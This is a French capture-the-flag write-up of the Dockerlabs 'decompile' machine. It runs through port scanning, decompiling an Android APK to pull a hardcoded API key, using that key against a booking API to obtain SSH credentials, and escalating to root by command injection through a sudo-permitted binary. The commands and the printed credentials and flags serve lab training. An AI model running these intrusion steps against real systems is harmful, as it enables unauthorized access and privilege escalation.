---
Titre: decompile
date: 2026-10-13
Catégorie: Dockerlabs
Créateur: El Pingüino de Mario
tags:
  - api
  - command-injection
  - apktool
  - android
description: decompile est une machine dockerlabs de niveau moyen qui enseigne la décompilation de l'apk, le retro ingénierie, l'énumération des Endpoint et le codage de secret en dure dans l'apk mobile  qui expose la clé api coter mobile
image:
  path: /assets/img/decompile.png
niveau: moyen
---
## Reconnaissance - scan de port

nous allons faire un balayage de ports avec nmap

```bash
┌──(d4fl0n㉿kali)-[~/Labs/dockerlabs/decompile]
└─$ nmap -p- 172.17.0.2                  
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-13 08:56 -0400
Nmap scan report for 172.17.0.2
Host is up (0.000024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 86:B8:E5:CB:96:A3 (Unknown)
```

```bash
┌──(d4fl0n㉿kali)-[~/Labs/dockerlabs/decompile]
└─$ nmap -p 22,80 -A -O -sCV 172.17.0.2
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-13 10:59 -0400
Nmap scan report for 172.17.0.2
Host is up (0.0012s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 (protocol 2.0)
| ssh-hostkey: 
|   256 12:b5:eb:08:ca:4b:18:51:d8:43:b6:59:a7:ec:e0:74 (ECDSA)
|_  256 61:85:56:a8:cb:5d:c2:2e:00:db:a9:bd:e5:10:09:79 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: InmoHogar \xC2\xB7 Roomshare Madrid
|_http-server-header: nginx/1.18.0 (Ubuntu)
MAC Address: 86:B8:E5:CB:96:A3 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

le nous avons deux port ouverts 22,80

## Enumération web - répertoire et fichiers

nous allons essayer d'accéder au site web `http://172.17.0.2` pour voir le contenu de la page d'accueil

![](/assets/img/decompile-web.png)

la page d'accueil nous propose le téléchargement de la dernière version de l'apk `Android`  ainsi qu'une note qui nous dit `si l'apk n'est installe... l'indice interessant est dans` **`com/inmohogar/roomshare/BuildConfig.java`**

téléchargeons l'apk ainsi que décompilons

```bash
┌──(d4fl0n㉿kali)-[~/Labs/dockerlabs/decompile]
└─$ wget http://172.17.0.2/app-release.apk
--2026-10-13 11:07:56--  http://172.17.0.2/app-release.apk
Connecting to 172.17.0.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8613 (8.4K) [application/vnd.android.package-archive]
Saving to: ‘app-release.apk.1’

app-release.apk.1                                    100%[======================================================================================================================>]   8.41K  --.-KB/s    in 0.002s  

2026-10-13 11:07:56 (4.71 MB/s) - ‘app-release.apk.1’ saved [8613/8613]
```

**** décompilation

```bash
┌──(d4fl0n㉿kali)-[~/Labs/dockerlabs/decompile]
└─$ apktool d app-release.apk
I: Using Apktool 2.7.0-dirty on app-release.apk
I: Decoding AndroidManifest.xml with only framework resources...
Exception in thread "main" brut.androlib.err.RawXmlEncounteredException: Could not decode XML
	at brut.androlib.res.decoder.XmlPullStreamDecoder.decode(XmlPullStreamDecoder.java:145)
	at brut.androlib.res.decoder.XmlPullStreamDecoder.decodeManifest(XmlPullStreamDecoder.java:151)
	at brut.androlib.res.decoder.ResFileDecoder.decodeManifest(ResFileDecoder.java:172)
	at brut.androlib.res.AndrolibResources.decodeManifest(AndrolibResources.java:153)
	at brut.androlib.Androlib.decodeManifestFull(Androlib.java:125)
	at brut.androlib.ApkDecoder.decode(ApkDecoder.java:120)
	at brut.apktool.Main.cmdDecode(Main.java:175)
	at brut.apktool.Main.main(Main.java:79)
Caused by: java.io.IOException: Expected: 0x00080003 or 0x00080001, got: 0x6d783f3c
	at brut.util.ExtDataInput.skipCheckInt(ExtDataInput.java:45)
	at brut.androlib.res.decoder.AXmlResourceParser.doNext(AXmlResourceParser.java:834)
	at brut.androlib.res.decoder.AXmlResourceParser.next(AXmlResourceParser.java:98)
	at brut.androlib.res.decoder.AXmlResourceParser.nextToken(AXmlResourceParser.java:108)
	at org.xmlpull.v1.wrapper.classic.XmlPullParserDelegate.nextToken(XmlPullParserDelegate.java:105)
	at brut.androlib.res.decoder.XmlPullStreamDecoder.decode(XmlPullStreamDecoder.java:138)
	... 7 more
```

L'erreur **`brut.androlib.err.RawXmlEncounteredException`** signifie que `Apktool` s'attendait à lire un fichier binaire compilé (`AXML`), mais qu'il a trouvé à la place du **XML brut en texte clair** (`<?xm` ou `0x6d783f3c` en hexadécimal).

**Remarque:** Cela se produit généralement lorsque l'APK a été construit avec une configuration spécifique qui ne compile pas le fichier `AndroidManifest.xml`

nous allons maintenant essayer d'ignore le fichier `AndroidManifest.xml` pour décompiler l'apk

```bash
┌──(d4fl0n㉿kali)-[~/Labs/dockerlabs/decompile]
└─$ apktool d -r app-release.apk
I: Using Apktool 2.7.0-dirty on app-release.apk
I: Copying raw manifest...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
```

apk décompiler nous allons lire le fichier d'indice **`com/inmohogar/roomshare/BuildConfig.java`**

```bash
┌──(d4fl0n㉿kali)-[~/Labs/dockerlabs/decompile]
└─$ strings app-release/unknown/com/inmohogar/roomshare/BuildConfig.class
DEBUG
ConstantValue
APPLICATION_ID
Ljava/lang/String;
BUILD_TYPE
VERSION_CODE
VERSION_NAME
BOOKING_API_KEY
BOOKING_BASE_URL
TENANT_ACCOUNT
AUTH_HEADER
CTF_STAGE1
<init>
Code
LineNumberTable
SourceFile
BuildConfig.java
#com/inmohogar/roomshare/BuildConfig
java/lang/Object
com.inmohogar.roomshare
release
3.4.2
(BKGVlytSjDihCgXmNPm1cM6QwhRjrT86yJ2sEaf9
https://booking.internal/v3/
INMO-MAD-PRIMARY
	X-API-Key
&FLAG{stage1_buildconfig_leak_BKGVlytS}
```

nous allons faire le brute force des répertoires

```bash
┌──(d4fl0n㉿kali)-[~/Labs/dockerlabs/decompile]
└─$ dirb http://172.17.0.2                                           

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Oct 13 11:25:05 2026
URL_BASE: http://172.17.0.2/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://172.17.0.2/ ----
+ http://172.17.0.2/about (CODE:200|SIZE:70)                                                                                                                                                                       
==> DIRECTORY: http://172.17.0.2/booking/      
```

nous avons trouver un répertoire appeler `booking` nous allons cette fois-ci `ffuf` pour énumérer les sous répertoire et fichier

```bash
┌──(d4fl0n㉿kali)-[~/Labs/dockerlabs/decompile]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://172.17.0.2/booking/FUZZ      

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2/booking/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

properties              [Status: 401, Size: 47, Words: 5, Lines: 1, Duration: 7ms]
:: Progress: [4750/4750] :: Job [1/1] :: 174 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

```bash
┌──(d4fl0n㉿kali)-[~/Labs/dockerlabs/decompile]
└─$ curl http://172.17.0.2/booking/properties                                                     
{"status": 401, "message": "missing X-API-Key"}      
```

il nous faut une clé `X-API_key` pour accéder a ce fichier 

dans le fichier d'indice **`com/inmohogar/roomshare/BuildConfig.java`** nous avons trouver cette clé, qui est 

```
BKGVlytSjDihCgXmNPm1cM6QwhRjrT86yJ2sEaf9
```

nous allons envoyer une requête avec la clé

```bash
┌──(d4fl0n㉿kali)-[~/Labs/dockerlabs/decompile]
└─$ curl http://172.17.0.2/booking/properties -H "X-API-Key: BKGVlytSjDihCgXmNPm1cM6QwhRjrT86yJ2sEaf9" 2>/dev/null | jq
{
  "properties": [
    {
      "id": "P-001",
      "address": "Calle Mayor 1, Madrid",
      "rooms": 3,
      "monthly_rent_eur": 850
    },
    {
      "id": "P-002",
      "address": "Calle Alcala 100, Madrid",
      "rooms": 4,
      "monthly_rent_eur": 1100
    },
    {
      "id": "P-003",
      "address": "Calle Velazquez 50, Madrid",
      "rooms": 2,
      "monthly_rent_eur": 720
    }
  ],
  "_ctf_hint": "Auth OK. Try POST /sessions with tenant_account=INMO-MAD-PRIMARY"
}
```

dans la réponse nous avons trouver une `endpoint` `sessions` qui accepte la méthode `POST` avec le contenu de payload 

```
tenant_account=INMO-MAD-PRIMARY
```


```bash
┌──(d4fl0n㉿kali)-[~/Labs/dockerlabs/decompile]
└─$ curl -X POST http://172.17.0.2/booking/sessions -H "X-API-Key: BKGVlytSjDihCgXmNPm1cM6QwhRjrT86yJ2sEaf9" 2>/dev/null | jq
{
  "id": "SES-73C64C5F69484E34",
  "tenant_account": "INMO-MAD-PRIMARY",
  "property_id": "P-001",
  "reference": "poc-408136",
  "sessionData": "stage2_accepted_stage2_api_key_accepted_1791894820",
  "status": "open",
  "_ctf_hint": "Auth accepted (Stage 2). Next: SSH user=deploy pwd=c0mpartir-p1s0s"
}
```

Bingo nous avons trouver les identifiant de connexion au ssh 

```
deploy:c0mpartir-p1s0s
```


## Exploitation - SSH connexion

```bash
┌──(d4fl0n㉿kali)-[~/Labs/dockerlabs/decompile]
└─$ ssh deploy@172.17.0.2
deploy@172.17.0.2's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.18.12+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

deploy@cdcad12541bb:~$ id
uid=1000(deploy) gid=1000(deploy) groups=1000(deploy)
```

## sudo -l

```bash
deploy@cdcad12541bb:~$ sudo -l
Matching Defaults entries for deploy on cdcad12541bb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User deploy may run the following commands on cdcad12541bb:
    (root) NOPASSWD: /opt/decompile/ssh/privesc/manage-svc
    (ALL) NOPASSWD: /usr/local/bin/restart-booking-gw
```

nous avons 2 programme qui on la permission d'exécuter `sudo`

## exploitation du binaire `manage-svc`

```bash
deploy@cdcad12541bb:~$ strings /opt/decompile/ssh/privesc/manage-svc
/lib64/ld-linux-x86-64.so.2
__cxa_finalize
__libc_start_main
fprintf
execl
setuid
geteuid
snprintf
stderr
setgid
perror
fwrite
__stack_chk_fail
libc.so.6
GLIBC_2.2.5
GLIBC_2.4
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
usage: manage-svc <action>
manage-svc: must be SUID (euid=%d)
logger -t decompile-ctf 'restart-booking-gw: %s' >/dev/null 2>&1 ; %s
bash
/bin/bash
execl
```

c'est binaire exécuter le programme `bash`

```bash
deploy@cdcad12541bb:~$ sudo /opt/decompile/ssh/privesc/manage-svc
usage: manage-svc <action>
```

nous allons essayer une injection de commande de l'entre du programme

```bash
deploy@cdcad12541bb:~$ sudo /opt/decompile/ssh/privesc/manage-svc id
uid=0(root) gid=0(root) groups=0(root)
deploy@cdcad12541bb:~$ 
```

notre commande a été exécuter

## escaler au compte root

```bash
deploy@cdcad12541bb:~$ sudo /opt/decompile/ssh/privesc/manage-svc 'sudo su' 
root@cdcad12541bb:/home/deploy# id
uid=0(root) gid=0(root) groups=0(root)
root@cdcad12541bb:/home/deploy# 
```

nous allons essayer de lire les flags


```bash
root@cdcad12541bb:/home/deploy# cat /home/deploy/flag-stage3.txt /root/flag-root.txt 
stage3_ssh_user_land_cdcad12541bb
FLAG{stage4_root_cdcad12541bb_1791894820}
```
